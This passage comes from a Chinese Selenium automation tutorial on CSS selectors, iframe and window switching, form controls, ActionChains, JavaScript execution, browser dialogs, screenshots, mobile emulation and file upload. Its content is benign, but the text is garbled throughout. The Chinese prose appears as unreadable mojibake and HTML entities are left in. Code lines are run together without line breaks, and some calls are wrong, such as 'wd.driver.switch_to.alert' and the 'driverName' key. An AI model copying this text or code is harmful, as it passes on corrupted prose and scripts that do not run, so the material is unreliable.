å¯ä»¥ç›´æ¥å†™\n:nth-child(2)\n\nè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®šçˆ¶å…ƒç´ , æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ¶å…ƒç´ çš„idæ¥æŒ‡å®š, è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹ç™½æœˆé»‘ç¾½æµ‹è¯•é¡µ\n#t1&gt;:nth-child(2)\n\n\nå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡å€’æ•°æ¥é€‰æ‹©, é€šè¿‡nth-last-child\nåƒè¿™æ ·\np:nth-last-child(2)\n\n\nçˆ¶å…ƒç´ çš„ç¬¬å‡ ä¸ªæŸç±»å‹çš„å­èŠ‚ç‚¹è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨:nth-of-type()\n\nåŒæ ·, å€’æ•°çš„æ˜¯:nth-last-of-type()\nå¥‡æ•°èŠ‚ç‚¹å’Œå¶æ•°èŠ‚ç‚¹æœè¦é€‰æ‹©çš„æ˜¯çˆ¶å…ƒç´ çš„ å¶æ•°èŠ‚ç‚¹ï¼Œä½¿ç”¨ nth-child(even)\næ¯”å¦‚\np:nth-child(even)\n\nå¦‚æœè¦é€‰æ‹©çš„æ˜¯çˆ¶å…ƒç´ çš„ å¥‡æ•°èŠ‚ç‚¹ï¼Œä½¿ç”¨ nth-child(odd)\np:nth-child(odd)\n\nå¦‚æœè¦é€‰æ‹©çš„æ˜¯çˆ¶å…ƒç´ çš„ æŸç±»å‹å¶æ•°èŠ‚ç‚¹ï¼Œä½¿ç”¨ :nth-of-type(even)\nå¦‚æœè¦é€‰æ‹©çš„æ˜¯çˆ¶å…ƒç´ çš„ æŸç±»å‹å¥‡æ•°èŠ‚ç‚¹ï¼Œä½¿ç”¨ :nth-of-type(odd)\n\nå…„å¼ŸèŠ‚ç‚¹é€‰æ‹©ç›¸é‚»çš„å…„å¼Ÿå…³ç³»æˆ‘ä»¬å¯ä»¥ç”¨+æ¥è¡¨ç¤º\n\nå¦‚æœä¸ç›¸é‚», ä½†æ˜¯æ˜¯åé¢çš„å…„å¼ŸèŠ‚ç‚¹, å¯ä»¥ç”¨~è¡¨ç¤º\n\nframeåˆ‡æ¢ è¿™é‡Œæˆ‘ä»¬å†æ¬¡å€Ÿç”¨ä¸€ä¸‹ç™½æœˆé»‘ç¾½çš„æµ‹è¯•é¡µ, æ¯”å¦‚è¯´, åœ¨è¿™ä¸ªç•Œé¢é‡Œæˆ‘ä»¬æƒ³è¦è·å–è¿™äº›è”¬èœçš„åå­—, æˆ‘ä»¬åƒå¾€å¸¸ä¸€æ ·, å†™ä¸‹è¿™ä¸€ä¸²ä»£ç \nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample2.html&#x27;)elements = wd.find_elements(By.CSS_SELECTOR, &#x27;.plant&#x27;)for i in elements:    print(i)\n\n\nä»”ç»†çœ‹, æˆ‘ä»¬ä¼šå‘ç°è¿™äº›å…ƒç´ éƒ½æ˜¯åœ¨ä¸€ä¸ªå«iframeçš„å…ƒç´ ä¸­, è¿™ä¸ªiframeä¸­åˆåµŒå¥—äº†ä¸€ä¸ªHTML, åœ¨HTMLè¯­æ³•ä¸­, frameå…ƒç´ æˆ–è€…iframeå…ƒç´ çš„å†…éƒ¨ä¼šåŒ…å«ä¸€ä¸ªè¢«åµŒå…¥çš„ä¸€ä¸ªHTML\nå¦‚æœæˆ‘ä»¬ç›´æ¥find_elementsçš„è¯, æ˜¯åœ¨æˆ‘ä»¬ç¬¬ä¸€å±‚çš„é‡Œå¯»æ‰¾, å¾ˆæ˜æ˜¾æ˜¯æ— æ³•æ‰¾åˆ°çš„, å°±ç®—æ‰¾åˆ°äº†ä¹Ÿä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„å†…å®¹\nå¦‚æœæˆ‘ä»¬è¦æ“ä½œè¢«åµŒå…¥çš„HTMLä¸­çš„å…ƒç´ , å°±å¿…é¡»åˆ‡æ¢ä¸€ä¸‹æ“ä½œèŒƒå›´, ä½¿ç”¨wd.switch_to.frame(frame_reference)\nå…¶ä¸­frame_referenceå¯ä»¥æ˜¯frameå…ƒç´ çš„å±æ€§nameæˆ–è€…ID\næ¯”å¦‚è¿™é‡Œ, å¯ä»¥ç›´æ¥å†™æˆwd.switch_to.frame(&#39;frame1&#39;)æˆ–è€…wd.switch_to.frame(&#39;innerFrame&#39;)\næˆ‘ä»¬ä¹Ÿå¯ä»¥å¡«å†™frameæ‰€å¯¹åº”çš„webelementå¯¹è±¡, å°±æ˜¯åœ¨.switch_to.frame()çš„æ‹¬å·é‡Œå†å¥—ç”¨find_elementç³»åˆ—çš„æ–¹æ³•, æ¯”å¦‚è¿™é‡Œä¹Ÿå¯ä»¥å†™æˆwd.switch_to.frame(wd.find_element(By.TAG_NAME, &quot;iframe&quot;))\næ‰€ä»¥æˆ‘ä»¬æ­£ç¡®çš„ä»£ç åº”è¯¥æ˜¯\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample2.html&#x27;)#wd.switch_to.frame(&#x27;frame1&#x27;)#wd.switch_to.frame(&#x27;innerFrame&#x27;)wd.switch_to.frame(wd.find_element(By.CSS_SELECTOR,&#x27;iframe&#x27;))elements = wd.find_elements(By.CSS_SELECTOR,&#x27;.plant&#x27;)for i in elements:    print(i.text)\n\n\né‚£ä¹ˆ, è¿™æ—¶å€™, å¦‚æœæˆ‘ä»¬æƒ³å†å‡ºæ¥æ“ä½œå¤–å±‚çš„HTMLå…ƒç´ æ€ä¹ˆåŠå‘¢, ä¾‹å¦‚è¿™é‡Œæˆ‘ä»¬æƒ³ç‚¹å‡»ä¸€ä¸‹è¿™ä¸ªå¤–å±‚çš„æŒ‰é’®\næˆ‘ä»¬åªéœ€è¦æ‰§è¡Œwd.switch_to.default_content()\nåƒè¿™æ ·, åªè¦è¿”å›äº†ä½ ç‚¹å‡»äº†å¤–éƒ¨æŒ‰é’®, å°±è¯´æ˜æˆ‘ä»¬ä»£ç æ‰§è¡ŒæˆåŠŸ\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample2.html&#x27;)#wd.switch_to.frame(&#x27;frame1&#x27;)#wd.switch_to.frame(&#x27;innerFrame&#x27;)wd.switch_to.frame(wd.find_element(By.CSS_SELECTOR,&#x27;iframe&#x27;))elements = wd.find_elements(By.CSS_SELECTOR,&#x27;.plant&#x27;)for i in elements:    print(i.text)wd.switch_to.default_content()wd.find_element(By.ID,&#x27;outerbutton&#x27;).click()respon = wd.find_element(By.CSS_SELECTOR,&#x27;#add&gt;li&#x27;)print(respon.text)\n\n\nçª—å£åˆ‡æ¢æœ‰æ—¶å€™æˆ‘ä»¬ä¼šé‡åˆ°, éœ€è¦ç‚¹å‡»è¶…é“¾æ¥è¿›å…¥åˆ°ä¸‹ä¸€ä¸ªçª—å£çš„æƒ…å†µ, æ¯”æ–¹è¯´è¿™é‡Œ, æˆ‘æƒ³é€šè¿‡bingæ‰¾åˆ°æˆ‘çš„Bç«™å, è¿›å…¥åˆ°æˆ‘çš„Bç«™é‡Œ\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  Byimport time#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cn.bing.com/&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_element(By.CSS_SELECTOR, &#x27;#sb_form_q&#x27;)#é€šè¿‡idé€‰æ‹©ç‰¹å®šå…ƒç´ elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.CSS_SELECTOR, &#x27;#search_icon&#x27;)# print(elements.get_attribute(&#x27;value&#x27;))# elements.clear()# elements.send_keys(&#x27;SkyMirror&#x27;)search.click()wd.implicitly_wait(5)wd.find_element(By.CSS_SELECTOR,&#x27;[data-bm=&quot;6&quot;]&gt;div&gt;h2&gt;a&#x27;).click()wd.implicitly_wait(5)for handle in wd.window_handles:    wd.switch_to.window(handle)    if &#x27;Charmersix&#x27; in wd.title:        breakprint(wd.title)\n\n\nå¦‚æœæˆ‘ä»¬æƒ³å†æ¬¡å›åˆ°åŸæ¥çš„ç•Œé¢, å¯ä»¥äº‹å…ˆä¿å­˜è€çª—å£, åƒè¿™æ ·\nmain = wd.current_window_handlewd.find_element(By.CSS_SELECTOR,&#x27;[data-bm=&quot;6&quot;]&gt;div&gt;h2&gt;a&#x27;).click()time.sleep(3)for handle in wd.window_handles:    wd.switch_to.window(handle)    if &#x27;Charmersix_å°å…­çš„ä¸ªäººç©ºé—´_å“”å“©å“”å“©_bilibili&#x27; in wd.title:        breakwd.switch_to.window(main)print(wd.title)\n\n\né€‰æ‹©æ¡†è¿™é‡Œå€Ÿç”¨ç™½æœˆé»‘ç¾½å¸ˆå‚…çš„æµ‹è¯•é¡µ\nradioç›´æ¥ä½¿ç”¨clickæ–¹æ³•ç‚¹å‡»é€‰æ‹©å³å¯, é¦–å…ˆ, æˆ‘ä»¬å¯ä»¥ç”¨:checkedæ¥åˆ¤æ–­å‡ºå·²ç»é€‰æ‹©çš„å…ƒç´ , ç„¶åæˆ‘ä»¬å†ç‚¹å‡»é‡æ–°é€‰æ‹©ä¸€ä¸ªæ–°çš„\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)element = wd.find_element(By.CSS_SELECTOR,&#x27;#s_radio input:checked&#x27;)#:checkedæ˜¯CSSä¼ªç±»é€‰æ‹©,å¯¹radioå’Œcheckboxç±»å‹çš„inputéƒ½æœ‰æ•ˆprint(&quot;å½“å‰é€‰æ‹©çš„æ˜¯&quot;+element.get_attribute(&#x27;value&#x27;))element = wd.find_element(By.CSS_SELECTOR,&#x27;#s_radio input[value=&quot;å°é›·è€å¸ˆ&quot;]&#x27;).click()element = wd.find_element(By.CSS_SELECTOR,&#x27;#s_radio input:checked&#x27;)print(&quot;å½“å‰é€‰æ‹©çš„å·²ç»æ”¹ä¸º&quot;+element.get_attribute(&#x27;value&#x27;))\n\n\ncheckboxcheckboxæ˜¯å¤é€‰æ¡†, è¿™é‡Œå¦‚æœå·²ç»é€‰æ‹©çš„æ¡†, å†å»ç‚¹å‡»å°±ä¼šå–æ¶ˆé€‰æ‹©, æ‰€ä»¥æˆ‘ä»¬åœ¨é€‰æ‹©å¼€å§‹å‰, æˆ‘ä»¬å°±å…ˆç­›é€‰å‡ºå·²ç»é€‰æ‹©æ¡†ç‚¹ä¸€ä¸‹å–æ¶ˆæ‰, ç„¶åå†å»é€‰æ‹©æˆ‘ä»¬æƒ³é€‰çš„\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)elements = wd.find_elements(By.CSS_SELECTOR,&#x27;#s_checkbox input:checked&#x27;)for element in elements:    print(&quot;å½“å‰é€‰æ‹©çš„ä¸º&quot;+element.get_attribute(&#x27;value&#x27;))    element.click()obj = wd.find_element(By.CSS_SELECTOR,&#x27;#s_checkbox input[value=&quot;å°é›·è€å¸ˆ&quot;]&#x27;).click()obj = wd.find_element(By.CSS_SELECTOR,&#x27;#s_checkbox input[value=&quot;å°æ±Ÿè€å¸ˆ&quot;]&#x27;).click()elements = wd.find_elements(By.CSS_SELECTOR,&#x27;#s_checkbox input:checked&#x27;)for element in elements:    print(&quot;å½“å‰é€‰æ‹©çš„å·²ç»æ”¹ä¸º&quot;+element.get_attribute(&#x27;value&#x27;))\n\n    \nselectradioå’Œcheckboxéƒ½æ˜¯inputå…ƒç´ , åªæ˜¯é‡Œè¾¹çš„typeä¸åŒè€Œå·²\nselectåˆ™æ˜¯ä¸€ä¸ªæ–°çš„selectæ ‡ç­¾, å¯¹äºselect, seleniumæä¾›äº†ä¸“é—¨çš„Selectç±»è¿›è¡Œæ“ä½œ\nSelectç±»ä¸­ æä¾›äº†ä»¥ä¸‹çš„æ–¹æ³•\n\nselect_by_value æ ¹æ®é€‰é¡¹çš„valueå±æ€§å€¼é€‰æ‹©å…ƒç´ \nselect_by_index æ ¹æ®é€‰é¡¹çš„æ¬¡åº(ä»1å¼€å§‹)é€‰æ‹©å…ƒç´ \nselect_by_visible_text æ ¹æ®é€‰é¡¹çš„å¯è§æ–‡æœ¬é€‰æ‹©å…ƒç´ \ndeselect_by_ æ˜¯å»é™¤é€‰ä¸­å…ƒç´ , åŒæ ·é€‚ç”¨ä¸Šè¿°æ–¹æ³•\ndeselect_all å»é™¤é€‰ä¸­çš„æ‰€æœ‰å…ƒç´ \n\nå•é€‰æ¡†å¯¹äºå•é€‰æ¡†, æ¯”è¾ƒç®€å•, æ— è®ºä¹‹å‰é€‰çš„ä»€ä¹ˆ, åªéœ€è¦ç›´æ¥é€‰æ‹©å³å¯\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import Selectwd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)obj = Select(wd.find_element(By.ID, &#x27;ss_single&#x27;))obj.select_by_visible_text(&#x27;å°æ±Ÿè€å¸ˆ&#x27;)print(&quot;å½“å‰é€‰æ‹©çš„ä¸º&quot;+obj.get_attribute(&#x27;value&#x27;))\n\n\nå¤šé€‰æ¡†åŒä¸Š, å…ˆç”¨deselect_all()æ¸…é™¤æ‰€æœ‰, ç„¶åå†é€‰æ‹©\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import Selectwd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)obj = Select(wd.find_element(By.ID, &#x27;ss_multi&#x27;))wd.implicitly_wait(5)obj.deselect_all()obj.select_by_value(&#x27;å°æ±Ÿè€å¸ˆ&#x27;)obj.select_by_value(&#x27;å°é›·è€å¸ˆ&#x27;)input()\n\n\nå®æˆ˜æŠ€å·§å…¶ä»–æ“ä½œæ–¹æ³•ä¹‹å‰æˆ‘ä»¬å¯¹webå…ƒç´ åšçš„ä¸»è¦æ“ä½œæ˜¯ï¼šé€‰æ‹©å…ƒç´ ,ç„¶åç‚¹å‡»å…ƒç´ æˆ–è€…è¾“å…¥å­—ç¬¦ä¸², å…¶ä»–æ“ä½œæˆ‘ä»¬å¯ä»¥é€šè¿‡Seleniumæä¾›çš„ActionChainsç±»æ¥å®ç°\nActionChainsç±»é‡Œé¢æä¾›äº†ä¸€äº›ç‰¹æ®Šçš„åŠ¨ä½œçš„æ¨¡æ‹Ÿ, æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹ActionChainsç±»çš„ä»£ç çœ‹åˆ°å¦‚ä¸‹æ–¹æ³•\nè¿™é‡Œæˆ‘ä»¬ä¸¾ä¸€ä¸ªé¼ æ ‡ç§»åŠ¨çš„ä¾‹å­, æ¯”å¦‚è¯´, æˆ‘ä»¬çš„ç™¾åº¦é¡µé¢ä¸Š, æœ‰è¿™ä¸ªæ›´å¤šæ¡†, è¿™ä¸ªæ¡†é‡Œçš„å†…å®¹åªæœ‰å°†é¼ æ ‡ç§»ä¸Šæ‰èƒ½æ˜¾ç¤ºå‡ºæ¥\nä»£ç å¦‚ä¸‹\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.action_chains import ActionChainswd = webdriver.Chrome()wd.implicitly_wait(5)wd.get(&#x27;https://www.baidu.com/&#x27;)ac = ActionChains(wd)ac.move_to_element(wd.find_element(By.CSS_SELECTOR, &#x27;[name=&quot;tj_briicon&quot;]&#x27;)).perform()#perform()å¿…é¡»è¦æœ‰, æ˜¯æ‰§è¡Œçš„æ„æ€, å¦åˆ™æ“ä½œä¸ä¼šæ‰§è¡Œ\n\n\næ‰§è¡ŒJavaScriptæˆ‘ä»¬å¯ä»¥è°ƒç”¨execute_scriptæ‰§è¡Œæˆ‘ä»¬çš„JavaScriptä»£ç \nä¾‹å¦‚, æœ‰æ—¶æˆ‘ä»¬è®¿é—®çš„ç½‘é¡µå¾ˆé•¿, æˆ‘ä»¬è¦ç‚¹å‡»çš„å…ƒç´ æ²¡æœ‰åœ¨çª—å£å¯ä»¥æ˜¾ç¤ºçš„èŒƒå›´å†…, seleniumå°±ä¼šæŠ¥ç±»ä¼¼è¿™ç§é”™è¯¯\nelement click intercepted: Element &lt;span&gt;è¿™é‡Œæ˜¯å…ƒç´ html&lt;/span&gt; is not clickable at point (119, 10). Other element would receive the click: &lt;div&gt;...&lt;/div&gt;\n\nè¿™æ—¶å€™, æˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸²ä»£ç , è®©éœ€è¦ç‚¹å‡»çš„å…ƒç´ å‡ºç°åœ¨é¡µé¢çš„æœ€ä¸­é—´\nwd.execute_script(&quot;arguments[0].scrollIntoView(&#123;block:&#x27;center&#x27;,inline:&#x27;center&#x27;&#125;)&quot;, job)\n\nå…¶ä¸­arguments[0]æŒ‡ä»£äº†åé¢çš„ç¬¬ä¸€ä¸ªå‚æ•°jobå¯¹åº”çš„jså¯¹è±¡, jså¯¹è±¡çš„scrollIntoViewæ–¹æ³•å°±æ˜¯è®©å…ƒç´ æ»šåŠ¨åˆ°å¯è§éƒ¨åˆ†\nblock:&#39;center&#39; æŒ‡å®šå‚ç›´æ–¹å‘å±…ä¸­\ninline:&#39;center&#39; æŒ‡å®šæ°´å¹³æ–¹å‘å±…ä¸­\næˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸²ä»£ç , æ¥åˆ¤æ–­æˆ‘ä»¬ä¸€ä¸ªç½‘ç«™åˆ°åº•æœ‰å‡ é¡µ\nnextPageButtonDisabled = driver.execute_script(    &#x27;&#x27;&#x27;    ele = document.querySelector(&#x27;.soupager &gt; button:last-of-type&#x27;);    return ele.getAttribute(&#x27;disabled&#x27;)    &#x27;&#x27;&#x27;)# è¿”å›çš„æ•°æ®è½¬åŒ–ä¸ºPythonä¸­çš„æ•°æ®å¯¹è±¡è¿›è¡Œåç»­å¤„ç†if nextPageButtonDisabled == &#x27;disabled&#x27;: # æ˜¯æœ€åä¸€é¡µ    return Trueelse: # ä¸æ˜¯æœ€åä¸€é¡µ    return False\n\n\nè¿™æ®µä»£ç æ˜¯ä½¿ç”¨ Selenium WebDriver å’Œ JavaScript æ‰§è¡Œä¸€ä¸ªæŸ¥è¯¢ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸‹ä¸€é¡µçš„æŒ‰é’®ï¼Œå¹¶è¿”å›è¯¥æŒ‰é’®æ˜¯å¦è¢«ç¦ç”¨(disabled)çš„çŠ¶æ€ã€‚\nå…·ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç åšäº†ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š\n\nä½¿ç”¨ driver.execute_script() æ–¹æ³•æ¥æ‰§è¡Œä¸€ä¸ª JavaScript ä»£ç å—ã€‚\nJavaScript ä»£ç å—ä¸­ï¼Œä½¿ç”¨ document.querySelector() æ–¹æ³•é€‰æ‹©äº† HTML æ–‡æ¡£ä¸­çš„ä¸€ä¸ª class ä¸º soupager çš„å…ƒç´ ï¼Œå¹¶é€‰ä¸­äº†è¯¥å…ƒç´ ä¸‹é¢çš„æœ€åä¸€ä¸ª button å…ƒç´ ã€‚\næ¥ç€ä½¿ç”¨ ele.getAttribute(&#39;disabled&#39;) æ–¹æ³•è·å–è¯¥ button å…ƒç´ çš„ disabled å±æ€§å€¼ï¼Œå¹¶å°†å…¶è¿”å›ç»™ Python å˜é‡ nextPageButtonDisabledã€‚\næœ€åæ ¹æ® nextPageButtonDisabled çš„å€¼æ˜¯å¦ä¸ºå­—ç¬¦ä¸² â€˜disabledâ€™ï¼Œæ¥åˆ¤æ–­ä¸‹ä¸€é¡µçš„æŒ‰é’®æ˜¯å¦è¢«ç¦ç”¨(disabled)ã€‚\n\nå¦‚æœ nextPageButtonDisabled çš„å€¼ä¸º â€˜disabledâ€™ï¼Œåˆ™è¡¨ç¤ºä¸‹ä¸€é¡µçš„æŒ‰é’®å·²è¢«ç¦ç”¨ï¼ŒPython å‡½æ•°å°†è¿”å› Trueï¼›å¦åˆ™ï¼ŒPython å‡½æ•°å°†è¿”å› Falseã€‚\n\nå†»ç»“ç•Œé¢åƒä¸Šé¢ä¾‹å­ä¸€æ ·, å½“æˆ‘ä»¬å…‰æ ‡ç§»å¼€çš„æ—¶å€™, æ›´å¤šé‡Œé¢çš„å†…å®¹å°±æ— äº†, è¿™æ—¶å€™æˆ‘ä»¬å¦‚æœæƒ³è¦è¿›ä¸€æ­¥æ“æ›´å¤šé‡Œé¢çš„å†…å®¹, æˆ‘ä»¬å°±éœ€è¦å°†çœ¼å‰çš„ç•Œé¢å†»ç»“, æ‰èƒ½ç»§ç»­æ“ä½œ\nè¿™é‡Œæˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨JavaScriptä»£ç çš„debuggeråŠŸèƒ½, å†»ç»“é¡µé¢\nå¯ä»¥è®©æµè§ˆå™¨æ‰§è¡Œä¸‹åˆ—jsä»£ç , è¿›å…¥debugçŠ¶æ€, å†»ä½ç•Œé¢\nsetTimeout(function()&#123;debugger&#125;, 5000)\n\nè¿™ä¸²ä»£ç æ„æ€æ˜¯, åœ¨5000msä¹Ÿå°±æ˜¯5så, æ‰§è¡Œé¡µé¢çš„debuggerå‘½ä»¤, å†»ä½ç•Œé¢, ç”±äºæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œé¼ æ ‡ç§»åŠ¨çš„æ“ä½œ, æ‰€ä»¥è¯´è¦åœ¨5såå†»ä½ç•Œé¢\nè¿™æ ·å°±æ–¹ä¾¿æˆ‘ä»¬å¯»æ‰¾å…ƒç´ \nå¼¹å‡ºå¯¹è¯æ¡†Alertalertå¼¹å‡ºæ¡†, seleniumæä¾›äº†ç‚¹å‡»æ–¹æ³•\nwd.driver.switch_to.alert.accept()\n\nå¦‚æœæ˜¯è·å–å¯¹è¯æ¡†ä¸­çš„æ–‡æœ¬, å¯ä»¥é€šè¿‡å¦‚ä¸‹ä»£ç \nwd.switch_to.alert.text\n\nConfirmç›¸æ¯”äºalert, å¤šäº†ä¸€ä¸ªå–æ¶ˆæŒ‰é’®, å¯ä»¥ç”¨dismiss, ä»£ç å¦‚ä¸‹\nwd.switch_to.alert.dismiss()\n\nPromptç›¸æ¯”äºä¸Šé¢ä¸¤ä¸ª, å¤šäº†ä¸€ä¸ªå¡«ä¿¡æ¯çš„æ¡†, æ–¹æ³•å¦‚ä¸‹\nwd.switch_to.alert.send_keys()\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„ä»£ç æ„Ÿå—ä¸€ä¸‹\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.implicitly_wait(5)wd.get(&#x27;https://www.baidu.com/&#x27;)wd.execute_script(&quot;alert(&#x27;charmersixalert&#x27;)&quot;)alert = wd.switch_to.alertprint(alert.text)alert.accept()prompt = wd.execute_script(&quot;confirm(&#x27;charmersixconfirm&#x27;)&quot;)confirm = wd.switch_to.alertprint(confirm.text)confirm.dismiss()wd.execute_script(&quot;prompt(&#x27;charmersixprompt&#x27;)&quot;)prompt = wd.switch_to.alertprint(prompt.text)prompt.send_keys(&quot;666&quot;)prompt.accept()\n\n\nçª—å£è·å–çª—å£å¤§å°wd.get_window_size()\n\n\n\næ”¹å˜çª—å£å¤§å°wd.set_window_size(x, y)\n\nè·å–å½“å‰çª—å£æ ‡é¢˜wd.title\n\nè·å–å½“å‰çª—å£çš„urlåœ°å€wd.current_url\n\næˆªå±åœ¨åšè‡ªåŠ¨åŒ–æµ‹è¯•çš„æ—¶å€™, æˆ‘ä»¬æœ‰æ—¶å€™éœ€è¦æˆªå±æ–¹ä¾¿äººå·¥æ ¸æŸ¥æˆ–è€…æ–¹ä¾¿debug, è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨get_screenshot_as_fileæ–¹æ³•æ¥æˆªå±å¹¶ä¿å­˜\nwd.get_screenshot_as_file(&#x27;./1.png&#x27;)\n\næ‰‹æœºæ¨¡å¼å¯ä»¥é€šè¿‡desired_capabilitieså‚æ•°, æŒ‡å®šä»¥æ‰‹æœºæ¨¡å¼æ‰“å¼€chromeæµè§ˆå™¨\nè¿™é‡Œæˆ‘ä»¬ç»Ÿä¸€å®éªŒä¸€ä¸‹ä¸Šè¿°ä»£ç \nfrom selenium import webdrivermobile_emulation = &#123;&quot;driverName&quot;: &quot;iphone6s&quot;&#125;cheome_option = webdriver.ChromeOptions()cheome_option.add_experimental_option(&quot;mobileEmulation&quot;, mobile_emulation)wd = webdriver.Chrome(desired_capabilities = cheome_option.to_capabilities())wd.get(&#x27;http://www.baidu.com&#x27;)size = wd.get_window_size()title = wd.titleurl = wd.current_urlwd.get_screenshot_as_file(&#x27;./1.png&#x27;)print(size, title, url)wd.quit()\n\n\nä¸Šä¼ æ–‡ä»¶é€šå¸¸, ç½‘ç«™é¡µé¢ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½, æ˜¯é€šè¿‡typeå±æ€§ä¸ºfileçš„HTML inputå…ƒç´ å®ç°çš„, æˆ‘ä»¬æƒ³è¦è‡ªåŠ¨åŒ–ä¸Šä¼ æ–‡ä»¶, åªéœ€è¦å®šä½åˆ°inputå…ƒç´ , ç„¶åé€šè¿‡send_keysæ–¹æ³•ä¼ å…¥è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„å³å¯\nele = wd.find_element(By.CSS_SELECTOR, &#x27;input[type=file]&#x27;)# å…ˆå®šä½åˆ°ä¸Šä¼ æ–‡ä»¶çš„ input å…ƒç´ ele.send_keys(r&#x27;h:\\1.png&#x27;)# è°ƒç”¨send_keysæ–¹æ³•\n\nå¦‚æœéœ€è¦å¤šæ¬¡ä¸Šä¼ , åˆ™å¤šæ¬¡è°ƒç”¨å³å¯, ä½†æ˜¯ï¼Œæœ‰çš„ç½‘é¡µä¸Šä¼ ï¼Œæ˜¯æ²¡æœ‰ file ç±»å‹ çš„ input å…ƒç´ çš„ã€‚å°±éœ€è¦å†è‡ªå·±åˆ†æ\nå¦‚æœæ˜¯Windowsä¸Šçš„è‡ªåŠ¨åŒ–ï¼Œå¯ä»¥é‡‡ç”¨ Windows å¹³å°ä¸“ç”¨çš„æ–¹æ³•ï¼š\nç¡®ä¿ pywin32 å·²ç»å®‰è£…ï¼Œç„¶åå‚è€ƒå¦‚ä¸‹ç¤ºä¾‹ä»£ç \n# æ‰¾åˆ°ç‚¹å‡»ä¸Šä¼ çš„å…ƒç´ ï¼Œç‚¹å‡»driver.find_element(By.CSS_SELECTOR, &#x27;.dropzone&#x27;).click()sleep(2) # ç­‰å¾…ä¸Šä¼ é€‰æ‹©æ–‡ä»¶å¯¹è¯æ¡†æ‰“å¼€# ç›´æ¥å‘é€é”®ç›˜æ¶ˆæ¯ç»™ å½“å‰åº”ç”¨ç¨‹åºï¼Œ# å‰ææ˜¯æµè§ˆå™¨å¿…é¡»æ˜¯å½“å‰åº”ç”¨import win32com.clientshell = win32com.client.Dispatch(&quot;WScript.Shell&quot;)# è¾“å…¥æ–‡ä»¶è·¯å¾„ï¼Œæœ€åçš„&#x27;\\n&#x27;ï¼Œè¡¨ç¤ºå›è½¦ç¡®å®šï¼Œä¹Ÿå¯èƒ½æ—¶ &#x27;\\r&#x27; æˆ–è€… &#x27;\\r\\n&#x27;shell.Sendkeys(r&quot;h:\\a2.png&quot; + &#x27;\\n&#x27;)sleep(1)\n\n\nè¿™æ®µä»£ç æ˜¯ä½¿ç”¨Pythonä¸­çš„Seleniumåº“ï¼Œæ¨¡æ‹Ÿç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„æ“ä½œã€‚ä¸‹é¢æ˜¯é€è¡Œè§£é‡Šï¼š\n\ndriver.find_element(By.CSS_SELECTOR, &#39;.dropzone&#39;).click(): è¿™è¡Œä»£ç ä½¿ç”¨Seleniumåº“çš„find_elementæ–¹æ³•æ ¹æ®CSSé€‰æ‹©å™¨å®šä½é¡µé¢ä¸Šclassä¸ºdropzoneçš„å…ƒç´ ï¼Œç„¶åä½¿ç”¨clickæ–¹æ³•æ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡»è¯¥å…ƒç´ ï¼Œä»¥æ­¤è§¦å‘æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ã€‚\nsleep(2): è¿™è¡Œä»£ç ä½¿ç”¨Pythonæ ‡å‡†åº“çš„timeæ¨¡å—ä¸­çš„sleepå‡½æ•°ï¼Œè®©ç¨‹åºç­‰å¾…2ç§’é’Ÿï¼Œç­‰å¾…ä¸Šä¼ é€‰æ‹©æ–‡ä»¶å¯¹è¯æ¡†æ‰“å¼€ã€‚\nimport win32com.client: è¿™è¡Œä»£ç 